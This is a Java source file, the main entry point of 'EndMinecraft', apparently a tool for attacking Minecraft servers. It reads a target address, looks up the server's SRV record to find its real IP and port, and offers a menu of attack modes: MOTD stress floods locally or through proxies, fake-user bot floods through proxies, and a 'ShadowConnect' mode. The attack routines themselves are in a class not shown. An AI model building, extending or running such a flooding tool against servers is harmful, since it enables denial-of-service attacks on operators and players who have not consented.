package me.alikomi.endminecraft;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Hashtable;
import java.util.Scanner;

import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.InitialDirContext;

import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.MCForgeProtocol.MCForgeInject;

public class Main extends Utils {
    private static Scanner scanner = new Scanner(System.in);
    private static Menu menu = new Menu(scanner);

    public static void main(String[] args) throws Exception {
        menu.selectVersion();
        MCForgeInject.inject();
        getInfo();
        showMenu();
    }

    private static void getInfo() throws NamingException {
        String ip;
        int port = 25565;

        log("You are using EMP.Int", "", "=======================");
        log("Input IP Address");
        ip = scanner.nextLine();
        if (ip.contains(":")) {
            String[] tmpip = ip.split(":");
            ip = tmpip[0];
            port = Integer.parseInt(tmpip[1]);
        } else {
            log("Input Port(Default: 25565)");
            port = getCo(scanner.nextLine(), 25565);
        }
        Hashtable<String, String> hashtable = new Hashtable<String, String>();
        hashtable.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
        hashtable.put("java.naming.provider.url", "dns:");
        try {
            Attribute qwqre = (new InitialDirContext(hashtable))
                    .getAttributes((new StringBuilder()).append("_Minecraft._tcp.").append(ip).toString(),
                            new String[]{"SRV"})
                    .get("srv");
            if (qwqre != null) {
                String[] re = qwqre.get().toString().split(" ", 4);
                log("SRV record has been found, switch to real IP");
                ip = re[3];
                log("ip: " + ip);
                port = Integer.parseInt(re[2]);
                log("port: " + port);
            }
        } catch (Exception e) {
        }
        menu.setServer(ip, port);
    }

    private static void showMenu() throws IOException, InterruptedException {
        while (true) {
            log("Input Method", "1 : Motd Stress via Local", "2 : Fake users via Proxy", "3 : Motd Stress via Proxy", "4 : ShadowConnect via Proxy");
            log("========================");
            switch (getCo(scanner.nextLine(), 2)) {
                case 1:
                    menu._1();
                    return;
                case 2:
                    menu._2();
                    return;
                case 3:
                    menu._3();
                    return;
                case 4:
                    menu._4();
                    return;
                default:
                    log("You entered incorrectly, value must be 1-4");
            }
        }
    }
}